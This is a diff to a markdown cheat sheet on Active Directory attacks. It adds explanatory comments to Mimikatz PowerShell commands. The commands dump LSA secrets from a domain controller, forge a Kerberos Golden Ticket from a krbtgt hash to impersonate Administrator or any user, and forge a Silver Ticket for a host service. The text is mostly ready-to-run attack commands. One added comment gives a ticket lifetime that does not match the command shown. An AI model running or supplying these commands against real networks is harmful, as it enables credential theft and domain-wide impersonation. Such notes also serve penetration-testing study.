@@ -535,7 +535,9 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.loca
 ```powershell
 # Execute mimikatz on DC as DA to get hashes (especially the krbtgt hash)
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-# Golden Ticket (use pass-the-ticket impersonating administrator user
+# Golden Ticket: use the hash from krbtgt to impersonate Administrator using pass-the-ticket technique). 
+# Works until krbtgt password is changed two times. Ticket is valid for 10800 minutes (7 days). Can be more (10 years)
+# It can impersonate any user in domain, not only administrator
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
@@ -543,7 +545,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporat
 
 - **Invoke-Mimikatz:**
 ```powershell
-# Silver Ticket for service HOST
+# Silver ticket is about TGS
+# 
 Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'
 ```
 ```
